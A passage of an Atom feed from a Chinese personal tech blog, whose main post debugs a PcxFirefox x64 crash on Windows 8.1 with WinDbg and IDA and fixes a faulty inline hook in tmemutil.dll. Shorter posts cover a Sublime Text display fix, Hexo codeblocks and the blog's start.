%s'</span> % (fout, args))</span><br><span class="line">    os.remove(fout)</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[近日对某家族样本虚拟机检测进行分析，应同事要求，写了个脚本用于Patch及Load该家族样本，因之前没有相关经验，在编写过程中遇到一些问题，现将其整理如下。]]>
    
    </summary>
    
      <category term="Patch" scheme="http://smvirus.com/tags/Patch/"/>
    
      <category term="Python" scheme="http://smvirus.com/categories/Python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复Win8.1 x64环境下PcxFirefox打开文件崩溃]]></title>
    <link href="http://smvirus.com/2014/05/06/repair-pcxfirefox-crash-in-win81-x64-environment/"/>
    <id>http://smvirus.com/2014/05/06/repair-pcxfirefox-crash-in-win81-x64-environment/</id>
    <published>2014-05-06T11:19:46.000Z</published>
    <updated>2015-03-31T18:34:18.000Z</updated>
    <content type="html"><![CDATA[<p>最近在使用PcxFirefox浏览器时，发现其x64版本在Win8.1系统中一旦触发文件选择框，如下载/打开文件时，浏览器就会崩溃。</p>
<p>在网上搜索无果后，只好祭出神器Windbg查找原因。在这里对两位帮忙定位问题的同事bianfeng和KeyKernel由衷表示感谢。<br><a id="more"></a></p>
<h2 id="问题现象">问题现象</h2><p><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/crash.jpg" alt=""></p>
<h2 id="问题定位">问题定位</h2><h3 id="捕获异常">捕获异常</h3><p>首先使用Windbg重新加载崩溃程序Firefox.exe，然后执行g命令执行程序并触发崩溃，Windbg捕获到如下异常<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/windbg_crash.jpg" alt=""><br>得知错误代码出现在<code>00007ffa&#39;5bbab9fd</code>，在当前地址反汇编得到如下代码<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/u-rip.jpg" alt=""></p>
<h3 id="定位异常模块">定位异常模块</h3><p>查看当前出错模块路径如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="symbol">:</span><span class="number">000</span>&gt; lmf a rip</span><br><span class="line">start             <span class="keyword">end</span>                 <span class="class"><span class="keyword">module</span> <span class="title">name</span></span></span><br><span class="line"><span class="number">00007</span>ffa<span class="string">`5b9f0000 00007ffa`</span><span class="number">5</span>ce0700<span class="number">0</span>   <span class="constant">SHELL32</span>  <span class="constant">C</span><span class="symbol">:</span>\windows\system32\<span class="constant">SHELL32</span>.dll</span><br></pre></td></tr></table></figure></p>
<h3 id="分析异常代码">分析异常代码</h3><p>使用IDA Pro反汇编该模块后，发现该地址原始反汇编代码如下，与正在执行代码不同<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/ida-code.jpg" alt=""><br>向前遍历发现，模块中代码从<code>00007ffa&#39;5bbab9f0</code>处开始被覆写了14字节<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/u-b9f0.jpg" alt=""><br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/ida-b9f0.jpg" alt=""></p>
<h3 id="确认异常原因">确认异常原因</h3><p>从上图代码可知，该地址为SHGetSpecialFolderPathW函数地址，对比代码可知，该函数被inline hook。<br>进而可以确认崩溃原因是hook过程中将<code>00007ffa&#39;5bbab9fd</code>处一字节覆盖为0，导致cpu解释指令出错，产生异常并引起崩溃。<br>在Windbg中将其修正为48h后恢复进程执行，文件选择框正常被打开。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/fix-ok.jpg" alt=""></p>
<h3 id="定位HOOK来源">定位HOOK来源</h3><p>得知崩溃原因后，下一步开始定位是谁hook了SHGetSpecialFolderPathW函数<br>首先重新加载运行Firefox.exe，然后执行sxe ld:shell32.dll命令使调试器在加载该模块后中断程序<br>中断后对<code>00007ffa&#39;5bbab9f0</code>处下写入断点，然后继续执行程序，发现程序被中断在如下地址<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/ba-b9f0.jpg" alt=""><br>查看该地址模块路径如下<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; lmf a rip</span><br><span class="line">start             end                 module name</span><br><span class="line">00000000`63000000 00000000`6300a000   tmemutil D:<span class="command">\MyTools</span><span class="command">\Tools</span><span class="command">\UserSoft</span><span class="command">\PcxFireFox</span><span class="command">\tmemutil</span>.dll</span><br></pre></td></tr></table></figure></p>
<h3 id="分析HOOK代码">分析HOOK代码</h3><p>使用IDA Pro反汇编该模块后，发现正是该地址上下文代码hook了SHGetSpecialFolderPathW函数<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/ida-hook.jpg" alt=""></p>
<p>该段代码是将hook代码写入到SHGetSpecialFolderPathW函数起始处，但因为其使用的跳转方式为</p>
<blockquote>
<p>jmp qword ptr [xxxxxxxx]</p>
</blockquote>
<p>对应Opcode为</p>
<blockquote>
<p>ff 25 00 00 00 00 xx xx xx xx xx xx xx xx</p>
</blockquote>
<p>共需14字节。<br>从前文中可知SHGetSpecialFolderPathW函数地址距离之后代码只有13字节，故使用这种跳转方式进行hook，会覆盖掉函数中的代码，进而导致异常，引起崩溃。</p>
<h2 id="解决方案">解决方案</h2><p>因为该问题是由于temeutil模块对SHGetSpecialFolderPathW函数进行hook时使用了错误的跳转方式导致的，故考虑修改其跳转方式。<br>在64位系统下，除上述跳转方式外，还可使用如下方式进行绝对地址跳转</p>
<blockquote>
<p>mov rax,xxxxxxxx<br>jmp rax</p>
</blockquote>
<p>对应Opcode为</p>
<blockquote>
<p>48 b8 xx xx xx xx xx xx xx xx<br>ff e0</p>
</blockquote>
<p>这样仅需覆写12个字节即可完成hook，可以解决掉覆盖正常代码的问题。<br>因为没有找到可以直接patch64位程序的工具（Windbg/IDA Pro的patch功能均不支持带64位寄存器的指令），固只好在IDA Pro中进行Hex修改，然后通过WinHex保存到文件中。<br>修正后的代码如下<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/fix-hook.jpg" alt=""></p>
<p>需要注意的是，在hook函数内部会首先恢复SHGetSpecialFolderPathW的代码，调用完成后会重新inline hook，故需要对恢复hook的代码进行相同的修改。</p>
<h3 id="成果展示">成果展示</h3><p>完成上述步骤后，用修改后的dll文件替换掉原dll文件，再次测试触发文件选择框时，已可正常打开文件选择框。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/repair-pcxfirefox-crash-in-win81-x64-environment/is-ok.jpg" alt=""></p>
<h2 id="修正后文件">修正后文件</h2><p>版本：pcxFirefox-28.0-zhCN-vc2010-x64-sse2-betterpgo-140318<br>md5：7b6f5ce613e8d8c9e8b91ca4f6b6cc9039b0a6f5<br>下载：<a href="http://pan.baidu.com/s/1fCfsM" target="_blank" rel="external">temeutil.dll</a></p>
]]></content>
    <summary type="html">
    <![CDATA[最近在使用第三方编译版的Firefox浏览器PcxFirefox时，发现其x64版本在Win8.1系统中一旦触发文件选择框，如下载/打开文件时，浏览器就会崩溃。]]>
    
    </summary>
    
      <category term="Windbg" scheme="http://smvirus.com/tags/Windbg/"/>
    
      <category term="调试逆向" scheme="http://smvirus.com/categories/%E8%B0%83%E8%AF%95%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[解决Sublime Text中文字符显示为方块]]></title>
    <link href="http://smvirus.com/2014/04/08/solove-chinese-characters-display-as-squares-in-sublime-text/"/>
    <id>http://smvirus.com/2014/04/08/solove-chinese-characters-display-as-squares-in-sublime-text/</id>
    <published>2014-04-08T14:38:31.000Z</published>
    <updated>2015-03-30T13:23:16.000Z</updated>
    <content type="html"><![CDATA[<p>在笔记本上使用Sublime Text 3，发现其标签页及命令行中的中文均显示为方块。</p>
<p>本文记录了该问题的成因及解决方案。<br><a id="more"></a></p>
<h2 id="问题现象">问题现象</h2><p><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/solove-chinese-characters-display-as-squares-in-sublime-text/squares.jpg" alt=""></p>
<h2 id="问题成因">问题成因</h2><p>开始以为是编码问题导致的中文乱码，但是已经安装了ConvertToUTF8插件，而且编辑框内中文并未乱码，只有标签页和命令行乱码。<br>后经过搜索，发现有人提到如果修改了系统的显示缩放级别，将字体改的太大，则可能造成ST3版本的标签页放不下，进而显示成方块。<br>因为我的电脑是1920*1080的分辨率，系统默认将缩放级别调整为了125%。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/solove-chinese-characters-display-as-squares-in-sublime-text/125%25.jpg" alt=""></p>
<h2 id="解决方案">解决方案</h2><p>将缩放级别更改为100%后，在ST3中标签页及命令行已经可以正常显示中文了。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/solove-chinese-characters-display-as-squares-in-sublime-text/100%25.jpg" alt=""></p>
<h2 id="成果展示">成果展示</h2><p><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/solove-chinese-characters-display-as-squares-in-sublime-text/normal.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[在笔记本上使用Sublime Text 3，发现其标签页及命令行中的中文均显示为方块了。]]>
    
    </summary>
    
      <category term="问题记录" scheme="http://smvirus.com/categories/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用codeblock插入代码]]></title>
    <link href="http://smvirus.com/2014/04/05/use-codeblock-insert-code/"/>
    <id>http://smvirus.com/2014/04/05/use-codeblock-insert-code/</id>
    <published>2014-04-05T09:13:45.000Z</published>
    <updated>2015-03-31T18:38:50.000Z</updated>
    <content type="html"><![CDATA[<p>在测试在博文中插入代码时发现，使用缩进方式插入代码，即使在Hexo的配置文件中将line_number设置为true，代码框上也不会显示行号。<br>如下边这段代码直接使用缩进方式插入：</p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>{
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>对于如我这般的强迫症患者，想要显示行号时却发现没有行号，自然是百般的不自在，后经过搜索后发现，Markdown还支持显示声明Codeblock的方式插入代码。<br><a id="more"></a><br>其语法如下：</p>
<pre><code><span class="comment">{% codeblock [title] [lang:language] [url] [link text] %}</span>
<span class="comment">code snippet</span>
<span class="comment">{% endcodeblock %}</span>
</code></pre><p>关于Codeblock在Markdown中使用可以参考<a href="http://hexo.io/docs/tag-plugins.html#Code_Block" target="_blank" rel="external">这里</a>。<br>使用codeblock插入的代码，在Hexo中可正常显示行号，并且可以选择编程语言，增加代码标题，链接等。<br>如下边这段代码使用codeblock方式插入：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong> 参考文献： </strong></p>
<ul>
<li><a href="http://popozhu.github.io/2013/06/15/hexo%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE/" target="_blank" rel="external">hexo的代码高亮</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[在测试在博文中插入代码时发现，使用缩进方式插入代码，即使在Hexo的配置文件中将line_number设置为true，代码框上也不会显示行号。]]>
    
    </summary>
    
      <category term="Markdown" scheme="http://smvirus.com/tags/Markdown/"/>
    
      <category term="Hexo" scheme="http://smvirus.com/categories/Hexo/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[独立博客之旅]]></title>
    <link href="http://smvirus.com/2014/04/03/independent-blog-tour/"/>
    <id>http://smvirus.com/2014/04/03/independent-blog-tour/</id>
    <published>2014-04-03T05:19:15.000Z</published>
    <updated>2015-03-31T18:35:56.000Z</updated>
    <content type="html"><![CDATA[<p>一直以来没有写博客的习惯，发现很多问题在解决之后由于没有及时记录和总结，导致再次遇到时仍然无法解决，从而陷入了死循环中。遂决心开博客写文章，记录及总结近来遇到的问题及产生的想法。</p>
<p><strong> Hexo博客配置参考： </strong></p>
<ul>
<li><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">hexo你的博客</a></li>
<li><a href="http://kescoode.com/2013/11/17/github-page-and-hexo-guide/" target="_blank" rel="external">Github Pages与Hexo建个人博客流程 </a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[一直以来没有写博客的习惯，发现很多问题在解决之后由于没有及时记录和总结，导致再次遇到时仍然无法解决，从而陷入了死循环中。遂决心开博客写文章，记录及总结近来遇到的问题及产生的想法。]]>
    
    </summary>
    
      <category term="心情随笔" scheme="http://smvirus.com/categories/%E5%BF%83%E6%83%85%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>